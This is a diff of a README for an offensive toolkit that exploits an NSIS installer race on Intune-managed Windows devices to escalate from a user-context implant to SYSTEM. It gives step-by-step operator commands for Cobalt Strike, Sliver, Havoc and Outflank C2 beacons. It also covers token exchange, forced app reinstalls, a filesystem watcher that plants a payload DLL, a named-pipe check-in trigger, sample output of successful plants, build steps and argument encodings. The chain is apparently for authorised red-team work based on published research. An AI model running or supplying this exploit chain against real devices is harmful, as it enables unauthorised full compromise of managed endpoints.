@@ -5,9 +5,17 @@ NSIS installer race condition on Intune-managed Windows devices.
 Plants a DLL into the NSIS temp directory before the installer loads
 its own plugins. Escalates from a user-context implant to SYSTEM.
 
-Based on the research and [IMEClient](https://github.com/AmberWolfCyber/IMEClient)
-by AmberWolf. This repo reimplements the chain as BOFs (no .NET
-dependency) and adds the WCF named pipe check-in trigger.
+Based on the [research](https://blog.amberwolf.com/blog/2026/october/company-portal-self-service-to-system/) and [IMEClient](https://github.com/AmberWolfCyber/IMEClient) by AmberWolf.
+This repo reimplements the chain as BOFs (no .NET dependency) and adds
+the WCF named pipe check-in trigger.
+
+Three implementations are included:
+
+| Variant | Location | Format | Async race | C2 support |
+|---------|----------|--------|------------|------------|
+| **COFF BOF** | `bofs/` | `.o` object files | No (blocks beacon) | CS, Sliver, Havoc, OC2 |
+| **BOF-PE** | `bofs/pe/` | Linked DLLs | Yes (background job) | OC2 (Stage1) |
+| **.NET** | `csharp/` | Standalone exe | N/A (single command) | Any execute-assembly loader |
 
 ## Requirements
 
@@ -16,16 +24,19 @@ dependency) and adds the WCF named pipe check-in trigger.
 - A payload DLL (must be x86, see below)
 - At least one NSIS-based app assigned in Company Portal
 
-## BOF chain
+## Chain overview
 
 ```
-askwam → exchange → apps (uninstall) → race (arm) → apps (install) → checkin → SYSTEM shell
+askwam -> exchange -> apps (uninstall) -> race (arm) -> apps (install) -> checkin -> SYSTEM shell
 ```
 
-Six steps. No .NET, no CLR loading. The checkin BOF triggers IME
+Six steps. No .NET, no CLR loading. The checkin step triggers IME
 re-evaluation over the local WCF named pipe so the install starts
 within seconds instead of waiting for the next poll cycle (up to
 60 minutes).
+
+The BOF-PE race variant runs as an async background job, so the beacon
+stays responsive while the watcher waits for NSIS temp directories.
 
 ## Step 1: Get a MAM token
 
@@ -53,8 +64,14 @@ The exchange BOF swaps the MAM token for an Intune enrollment token.
 It auto-discovers the IWService host from IME logs and the device ID
 from the MDM enrollment certificate.
 
+COFF BOF:
 ```
 > intune-exchange <mam-token>
+```
+
+BOF-PE:
+```
+> intune-exchange-pe <mam-token>
 ```
 
 ```
@@ -80,8 +97,14 @@ pass `--host`:
 
 List the apps assigned to the device:
 
+COFF BOF:
 ```
 > intune-apps <enrollment-token> list
+```
+
+BOF-PE:
+```
+> intune-apps-pe <enrollment-token> list
 ```
 
 ```
@@ -134,8 +157,14 @@ https://amberwolfcyber.github.io/winget-stats/.
 If the target app is already installed, uninstall it first so Intune
 queues it for reinstall:
 
+COFF BOF:
 ```
 > intune-apps <enrollment-token> uninstall 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
+```
+
+BOF-PE:
+```
+> intune-apps-pe <enrollment-token> uninstall 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
 ```
 
 ```
@@ -150,9 +179,15 @@ Arm the filesystem watcher. This must be running before the install
 starts. Upload the payload DLL through the C2 file selector (OC2) or
 pass it from the team server (CS):
 
-OC2 (Stage1):
+COFF BOF (OC2, blocks beacon until timeout):
 ```
 > intune-race --timeout 300
+   (upload payload_test.dll via file selector)
+```
+
+BOF-PE (OC2, runs as async background job):
+```
+> intune-race-pe --timeout 300
    (upload payload_test.dll via file selector)
 ```
 
@@ -166,7 +201,12 @@ Cobalt Strike:
 [*] Watching C:\Windows\Temp for NSIS temp dirs (ns*.tmp)...
 ```
 
-In a second session (or thread), trigger the install:
+The BOF-PE race variant is async: the beacon keeps checking in and
+accepting commands while the watcher runs. Use `--timeout 0` for
+infinite monitoring. Stop the job with `task stop <job-id>`.
+
+In a second session (or in the same session with the async BOF-PE),
+trigger the install:
 
 ```
 > intune-apps <enrollment-token> install 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
@@ -186,29 +226,21 @@ you wait for the next poll cycle (up to 60 minutes). The checkin BOF
 calls `IStatusService.CheckIn` and `IStatusService.AvailableAppCheckIn`
 over the local WCF named pipe to trigger re-evaluation immediately:
 
+COFF BOF:
 ```
 > intune-checkin
 ```
 
+BOF-PE:
 ```
-[+] Resolved Global\net.pipe://+/INTUNEMANAGEMENTEXTENSION/STATUSSERVICE/ -> \\.\pipe\e5f893ef-f431-4015-8188-8c1004e26833
-[*] CheckIn: connecting (checkInGuid d5edb901-7292-4143-99a3-5bd3706a62a5)
-[*] session_open: opening pipe (substage 3)...
-[*] session_open: pipe opened, setting message mode...
-[*] session_open: pipe + mode + event OK
+> intune-checkin-pe
+```
+
+```
+[+] Resolved Global\net.pipe://+/INTUNEMANAGEMENTEXTENSION/STATUSSERVICE/ -> \\.\pipe\e5f893ef-...
 [+] Authenticated (package: NTLM)
-[*] session_open: NNS handshake OK
-[*] session_open: sending PreambleEnd...
-[*] session_open: PreambleAck received, session ready
 [+] CheckIn: got CheckInResponse (142 bytes)
-[*] AvailableAppCheckIn: connecting (checkInGuid 8a65d5e1-75e9-4864-b1bf-887fdd63a760)
-[*] session_open: opening pipe (substage 3)...
-[*] session_open: pipe opened, setting message mode...
-[*] session_open: pipe + mode + event OK
 [+] Authenticated (package: NTLM)
-[*] session_open: NNS handshake OK
-[*] session_open: sending PreambleEnd...
-[*] session_open: PreambleAck received, session ready
 [+] AvailableAppCheckIn: got AvailableAppCheckInResponse (166 bytes)
 [*] Done: 2 of 2 call(s) succeeded
 ```
@@ -226,16 +258,6 @@ plants the payload:
 
 The payload DLL runs as SYSTEM when NSIS loads it.
 
-To confirm the check-in triggered an evaluation cycle, check the IME
-log on the target:
-
-```
-> Get-Content "C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension.log" -Tail 30
-```
-
-Look for `AgentCheckIn` throttle counter increments and token
-acquisition entries at the timestamp of the BOF run.
-
 ## Passive variant
 
 If you do not need to trigger a specific app install, the chain reduces
@@ -243,9 +265,15 @@ to just the race BOF. Any NSIS installer on the system triggers it,
 whether the user started it from Company Portal, Intune pushed it, or
 someone ran it manually:
 
-OC2:
+COFF BOF (OC2):
 ```
 > intune-race --timeout 600
+   (upload payload_test.dll via file selector)
+```
+
+BOF-PE (OC2, async):
+```
+> intune-race-pe --timeout 0
    (upload payload_test.dll via file selector)
 ```
 
@@ -254,16 +282,89 @@ CS:
 > intune-race /opt/payloads/payload_test.dll nsExec.dll 600
 ```
 
+## BOF-PE variant
+
+The `bofs/pe/` directory contains BOF-PE versions of all four BOFs.
+BOF-PEs are fully linked DLLs instead of COFF object files. They use
+standard Windows API imports (no DFR macros), support full C/C++, and
+avoid the OC2 COFF loader quirks documented below (`.bss` not backed,
+DFR thunk corruption, `MSVCRT$free` crashes).
+
+The race BOF-PE is async: it runs as a background job using the
+[Outflank async BOF spec](https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/)
+(`BeaconGetStopJobEvent` / `BeaconWakeup`), so the beacon stays
+responsive while the watcher monitors for NSIS directories.
+
+BOF-PE commands on OC2:
+
+| BOF-PE | S1 command | Args |
+|--------|-----------|------|
+| exchange | `intune-exchange-pe` | `<mam_token> [--host <host>]` |
+| apps | `intune-apps-pe` | `<token> <list\|status\|install\|uninstall> [app_guid] [--host <host>]` |
+| race | `intune-race-pe` | `[--timeout 300]` + file upload (async) |
+| checkin | `intune-checkin-pe` | `[both\|checkin\|available]` (default: both) |
+
+### Build (BOF-PE)
+
+Requires `mingw-w64` cross-compilers and CMake:
+
 ```
-[*] Payload loaded: 15886 bytes. Plugin: nsExec.dll. Timeout: 600 s.
-[*] Watching C:\Windows\Temp for NSIS temp dirs (ns*.tmp)...
-[+] Planted nsExec.dll into C:\Windows\Temp\nsp9CAF.tmp (hit #1)
-[+] Planted nsExec.dll into C:\Windows\Temp\nsb9CAF.tmp (hit #2)
-[+] Planted nsExec.dll into C:\Windows\Temp\nsg9CAF.tmp (hit #3)
-[*] Done. Successful plants: 3
+cd bofs/pe
+cmake -B build-x64 -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-x64.cmake
+cmake --build build-x64
+cmake --install build-x64 --prefix dist
+
+cmake -B build-x86 -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-x86.cmake
+cmake --build build-x86
+cmake --install build-x86 --prefix dist
 ```
 
-## .NET alternative (csharp/)
+Output:
+- `dist/pe/*.o` -- prebuilt DLLs named for OC2's BOF-PE loader
+- `dist/ost/*.s1.py` -- OC2 Stage1 wrapper scripts
+- `dist/x64/`, `dist/x86/` -- standalone builds with `beacon.dll` for testing
+
+Deploy to OC2:
+```
+rsync -av dist/pe/ dist/ost/ <c2-host>:/opt/oc2/shared/bofs/custom/dist/
+```
+
+## COFF BOF variant
+
+The `bofs/` directory contains the original COFF BOF implementations.
+These are standard `.o` object files that work with Cobalt Strike,
+Sliver, Havoc, and OC2.
+
+### Build (COFF BOF)
+
+```
+cd bofs/
+make
+```
+
+Requires `mingw-w64` cross-compilers.
+
+### COFF BOF arguments
+
+| BOF | S1 command | Args |
+|-----|-----------|------|
+| exchange | `intune-exchange` | `<mam_token> [--host <host>]` |
+| apps | `intune-apps` | `<token> <list\|status\|install\|uninstall> [app_guid] [--host <host>]` |
+| race | `intune-race` | `[--plugin nsExec.dll] [--timeout 300]` + file upload |
+| checkin | `intune-checkin` | `[--stage N]` (default 6 = full run) |
+
+Raw BOF arg encoding (for non-S1 loaders):
+
+| BOF | Format | Fields |
+|-----|--------|--------|
+| exchange | `zz` | mam_token, host_override |
+| apps | `zzzz` | token, command, app_guid, host_override |
+| race | `bzi` | payload_dll_bytes, plugin_name, timeout_sec |
+| checkin | `zi` | operation ("checkin", "available", or "both"), stage |
+
+Cobalt Strike: load `bofs/intune.cna`.
+
+## .NET alternative
 
 `csharp/CompanyPortalRecon.exe` is a standalone .NET executable that
 implements the same chain without BOFs. It uses WCF for the named pipe
@@ -305,9 +406,8 @@ Trade-offs compared to the BOF chain:
 
 ## Payload DLL
 
-The same payload DLL works with both the BOF chain and the .NET
-variant. The race condition is in NSIS, not in the tooling that plants
-the file.
+The same payload DLL works with all three implementations. The race
+condition is in NSIS, not in the tooling that plants the file.
 
 The payload must be x86 (32-bit). NSIS is a 32-bit framework and loads
 plugins with `LoadLibrary` into its own process.
@@ -341,86 +441,52 @@ i686-w64-mingw32-gcc -shared -o payload_cmd.dll payload_cmd.c \
 i686-w64-mingw32-strip payload_cmd.dll
 ```
 
-## Build
-
-Cross-compile all BOFs from Linux:
-
-```
-cd bofs/
-make
-```
-
-```
-x86_64-w64-mingw32-gcc -I common -Wall -Wno-format -c -o exchange/exchange.x64.o exchange/exchange.c
-x86_64-w64-mingw32-gcc -I common -Wall -Wno-format -c -o apps/apps.x64.o apps/apps.c
-x86_64-w64-mingw32-gcc -I common -Wall -Wno-format -c -o race/race.x64.o race/race.c
-i686-w64-mingw32-gcc -I common -Wall -Wno-format -c -o exchange/exchange.x86.o exchange/exchange.c
-i686-w64-mingw32-gcc -I common -Wall -Wno-format -c -o apps/apps.x86.o apps/apps.c
-i686-w64-mingw32-gcc -I common -Wall -Wno-format -c -o race/race.x86.o race/race.c
-```
-
-Requires `mingw-w64` cross-compilers.
-
-## BOF arguments
-
-| BOF | S1 command | Args |
-|-----|-----------|------|
-| exchange | `intune-exchange` | `<mam_token> [--host <host>]` |
-| apps | `intune-apps` | `<token> <list\|status\|install\|uninstall> [app_guid] [--host <host>]` |
-| race | `intune-race` | `[--plugin nsExec.dll] [--timeout 300]` + file upload |
-| checkin | `intune-checkin` | `[--stage N]` (default 6 = full run) |
-
-Raw BOF arg encoding (for non-S1 loaders):
-
-| BOF | Format | Fields |
-|-----|--------|--------|
-| exchange | `zz` | mam_token, host_override |
-| apps | `zzzz` | token, command, app_guid, host_override |
-| race | `bzi` | payload_dll_bytes, plugin_name, timeout_sec |
-| checkin | `zi` | operation ("checkin", "available", or "both"), stage |
-
-Cobalt Strike: load `bofs/intune.cna`.
-
 ## Files
 
 ```
-├── bofs/                        # BOF chain
+├── bofs/                          # COFF BOF chain
 │   ├── Makefile
-│   ├── intune.cna               # Cobalt Strike aggressor script
+│   ├── intune.cna                 # Cobalt Strike aggressor script
 │   ├── common/
-│   │   ├── beacon.h             # CS/Sliver/Havoc BOF API
-│   │   └── bofdefs.h            # DFR declarations
-│   ├── exchange/
-│   │   ├── exchange.c           # MAM → enrollment token exchange
-│   │   └── *.s1.py              # Stage1 wrapper
-│   ├── apps/
-│   │   ├── apps.c               # App list/status/install/uninstall
-│   │   └── *.s1.py
-│   ├── race/
-│   │   ├── race.c               # NSIS race filesystem watcher
-│   │   └── *.s1.py
-│   └── checkin/
-│       ├── checkin.c             # IME WCF named pipe check-in trigger
-│       └── *.s1.py
-├── csharp/                      # .NET CompanyPortalRecon (alternative chain)
+│   │   ├── beacon.h               # CS/Sliver/Havoc BOF API
+│   │   └── bofdefs.h              # DFR declarations
+│   ├── exchange/                  # MAM -> enrollment token exchange
+│   ├── apps/                      # App list/status/install/uninstall
+│   ├── race/                      # NSIS race filesystem watcher
+│   └── checkin/                   # IME WCF named pipe check-in trigger
+├── bofs/pe/                       # BOF-PE chain (linked DLLs)
+│   ├── CMakeLists.txt
+│   ├── cmake/                     # MinGW cross-compile toolchain files
+│   ├── beacon/                    # beacon.dll (standalone test harness)
+│   ├── common/                    # Shared code (discovery, HTTP, PE headers)
+│   ├── exchange/                  # exchange BOF-PE
+│   ├── apps/                      # apps BOF-PE
+│   ├── race/                      # race BOF-PE (async)
+│   ├── checkin/                   # checkin BOF-PE
+│   ├── link.ld, link32.ld        # Linker scripts (x64, x86)
+│   └── dist/
+│       ├── pe/                    # Prebuilt DLLs (*.x64.o, *.x86.o)
+│       └── ost/                   # OC2 Stage1 wrapper scripts
+├── csharp/                        # .NET alternative (single exe)
 │   ├── Program.cs
 │   └── CompanyPortalRecon.csproj
-├── payloads/                    # Native C sources
-│   ├── payload_cmd.c            # Test payload (SYSTEM → user cmd.exe)
-│   ├── payload_test.c           # Minimal test payload
-│   └── intune_app.c             # Standalone app management exe (apps BOF origin)
-├── nsis_lookup.py               # NSIS vulnerability triage
+├── payloads/                      # Native C payload sources
+│   ├── payload_cmd.c              # SYSTEM -> user cmd.exe
+│   ├── payload_test.c             # Minimal test payload
+│   └── intune_app.c               # Standalone app management exe
+├── nsis_lookup.py                 # NSIS vulnerability triage
 ├── scripts/
-│   └── vlc-force-uninstall.ps1  # Force-remove VLC + clear IME cache
-└── winget-stats/                # NSIS database (git submodule)
+│   └── vlc-force-uninstall.ps1    # Force-remove VLC + clear IME cache
+└── winget-stats/                  # NSIS database (git submodule)
 ```
 
-## OC2 loader compatibility
+## OC2 COFF loader compatibility
 
-The BOFs work on standard Cobalt Strike and Sliver BOF loaders without
-changes. OC2's (Outflank C2) BOF loader has several quirks that required
-workarounds in the checkin and race BOFs. If you port these BOFs to
-another loader, you may need to adjust or remove these workarounds.
+The COFF BOFs work on standard Cobalt Strike and Sliver BOF loaders
+without changes. OC2's BOF loader has several quirks that required
+workarounds in the COFF checkin and race BOFs. The BOF-PE variants
+avoid all of these issues because they are linked DLLs with standard
+imports.
 
 ### .bss section not backed
 
